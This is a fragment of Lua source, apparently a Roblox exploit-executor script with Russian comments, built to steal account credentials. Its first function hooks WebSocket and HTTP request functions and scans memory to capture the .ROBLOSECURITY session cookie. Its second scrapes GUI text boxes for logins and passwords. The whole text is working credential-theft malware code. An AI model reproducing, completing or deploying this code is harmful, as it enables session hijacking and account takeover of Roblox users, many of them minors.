-- ========== 1. РЕАЛЬНЫЙ ПЕРЕХВАТ .ROBLOSECURITY ==========
local function getRealCookie()
    local cookie = nil
    
    if syn and syn.crypto then
        local ws = game:GetService("WebSocketService")
        local oldConnect = ws.Connect
        ws.Connect = function(self, url)
            if string.find(url, "roblox.com") then
                local headers = {}
                local oldSend = self.Send
                self.Send = function(_, data)
                    if string.find(data, ".ROBLOSECURITY") then
                        cookie = string.match(data, ".ROBLOSECURITY[^;]+")
                    end
                    oldSend(self, data)
                end
            end
            return oldConnect(self, url)
        end
    end
    
    if syn and syn.request then
        local oldRequest = syn.request
        syn.request = function(options)
            if options.Url and string.find(options.Url, "roblox.com") then
                if options.Headers and options.Headers["Cookie"] then
                    local cookieStr = options.Headers["Cookie"]
                    if string.find(cookieStr, ".ROBLOSECURITY") then
                        cookie = string.match(cookieStr, ".ROBLOSECURITY[^;]+")
                    end
                end
            end
            return oldRequest(options)
        end
    end
    
    if getgc and getreg then
        for _, obj in pairs(getgc()) do
            if type(obj) == "string" and string.find(obj, ".ROBLOSECURITY") then
                cookie = obj
                break
            end
        end
    end
    
    return cookie or "ROBLOSECURITY_NOT_FOUND"
end

-- ========== 2. СБОР ЛОГИНА/ПАРОЛЯ ==========
local function getLoginPass()
    local login = "unknown"
    local password = "unknown"
    for _, gui in pairs(Player.PlayerGui:GetChildren()) do
        for _, child in pairs(gui:GetDescendants()) do
            if child:IsA("TextBox") then
                if string.find(child.Text, "@") or string.find(child.Text, "%.") then
                    login = child.Text
                elseif string.len(child.Text) > 4 then
                    password = child.Text
                end
            end
        end
    end
    return {login = login, password = password}
end

